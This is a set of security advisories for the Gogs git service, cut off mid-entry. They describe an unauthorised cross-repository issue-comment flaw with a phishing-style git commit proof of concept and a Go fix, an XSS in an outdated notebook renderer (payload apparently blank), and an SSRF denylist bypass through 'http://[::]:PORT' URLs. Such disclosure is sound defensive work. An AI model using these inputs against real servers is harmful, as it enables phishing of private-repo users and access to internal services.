GHSA-53f6-cgcf-gp6v.description: ## Summary When commits are pushed, Gogs scans their messages for `owner/repo#N` references and adds a 'referenced this issue' comment to each referenced issue. It does this for any repository, including private ones the pusher has no access to. An attacker therefore pushes a commit to their own repository whose message references `victim/private-repo#1`, and a comment with attacker-controlled text and links appears in the victim's private issue. The response also confirms whether a private issue exists. Reproduced on `v0.14.3` and on `main` @ `dbbd717e`. ## Details `internal/database/actions.go`, `updateCommitReferencesToIssues`: - `GetIssueByRef(ref)` resolves an issue in any repository. - `CreateRefComment(doer, repo, issue, message, sha)` is then called with no permission check. The close and reopen keyword loops in the same function do limit themselves to `issue.RepoID == repo.ID`. ## Proof of concept Setup: alice owns the private repo `alice/secret` with issue #1. mallory has no access to it. All of these return 404 or non-200: - the issue through the API, - commenting on it through the API, - the issue in the web UI. mallory pushes to her own repository: ``` git commit -m 'alice/secret#1 Session expired, sign in again' git push ``` A comment by mallory then appears on `alice/secret#1`, containing the attacker's link, and alice's issue page renders the link. With the patch below, no comment is created. alice's own cross-repo reference to her issue still produces a comment. Executed on the official release binaries v0.13.0 (`gogs_0.13.0_linux_amd64.tar.gz`, sha256 `75da1c026cacb187a7c1dcad8263873ec566ce30cc0df56dd1dc129b8292d34f`) and v0.14.3 (`gogs_v0.14.3_linux_amd64.tar.gz`, sha256 `c27fbd8337ebd661929389f5237bf601e09958d514835c99fad3b904c63bedb2`), and on `main` @ `dbbd717e`. Cross-repository issue references are an intended feature; the problem is only that they are honoured for repositories the pusher cannot read. A self-contained script is available on request. ## Impact Anyone without access can write into private repositories' issues, which is useful for phishing repository members with links that appear inside their private tracker. It also reveals whether private issues exist. ### Remediation For references outside the pushed repository, require the pusher to have at least read access before creating the comment: ```go if issue.RepoID != repo.ID { refRepo, err := GetRepositoryByID(issue.RepoID) if err != nil { return err } if !Handle.Permissions().Authorize(context.TODO(), doer.ID, refRepo.ID, AccessModeRead, AccessModeOptions{OwnerID: refRepo.OwnerID, Private: refRepo.IsPrivate}) { continue } } ``` I would appreciate a CVE being requested for this issue. ### Credits Please credit as: Dylan McGuinness (GitHub @dylanzonix), Ambit Security (finder, reporter).

GHSA-6vxv-wg6j-5qwp.title: Gogs: XSS in .ipynb files renderer due to outdated notebookjs
GHSA-6vxv-wg6j-5qwp.description: ### Summary Gogs renders Jupyter notebook files (`.ipynb`) using [jsvine/notebookjs](https://github.com/jsvine/notebookjs), but the version is outdated, missing patches for known XSS vulnerabilities. ### Details Gogs uses version 0.4.2 of notebookjs to render Jupyter notebook files: https://github.com/gogs/gogs/blob/7297aee50d4c115836c7de8a3a233daaef87b911/templates/base/head.tmpl#L47 The latest version of [jsvine/notebookjs](https://github.com/jsvine/notebookjs) is 0.8.3, patching many XSS vulnerabilities in its releases. The proof of concept below shows an example working payload that renders HTML through Markdown. ### PoC 1. Create a new repository 2. Create a file inside the repository named `xss.ipynb` and give it the following content: ```json {"cells": [{"cell_type": "markdown", "metadata": {}, "source": [""]}], "metadata": {}, "nbformat": 4, "nbformat_minor": 2} ``` 3. Save the file and view the file in Gogs. Notice that the XSS popup triggers: ### Impact Any user with rights to create repositories can create XSS payloads that take over the victim's account when visited. Either through their own exploration of the files or by directly linking them the vulnerable URL.

GHSA-799r-mx22-r63q.title: SSRF bypass via IPv6 unspecified address :: in repository migration, mirror sync, and webhooks
GHSA-799r-mx22-r63q.description: ## Summary The SSRF protection introduced in commit b9a0093e9c ('security: close SSRF in repository migration and recurring mirror sync') is incomplete. The CIDR-based IP denylist in `internal/netx/netx.go` blocks `::1/128` (IPv6 loopback) but does not block `::/128` (IPv6 unspecified address). On Linux systems with dual-stack networking, connecting to `::` reaches localhost, allowing SSRF via `http://[::]:PORT/path` in repository migration, mirror sync, webhook creation, and webhook delivery. ## Impact An authenticated attacker with permission to create a repository migration, mirror, or webhook can bypass the SSRF guard by using `http://[::]:PORT/path` as the target URL. This allows the attacker to reach localhost services (Redis, databases, internal APIs) and cloud metadata endpoints in hosted environments. ## Reproduction 1.
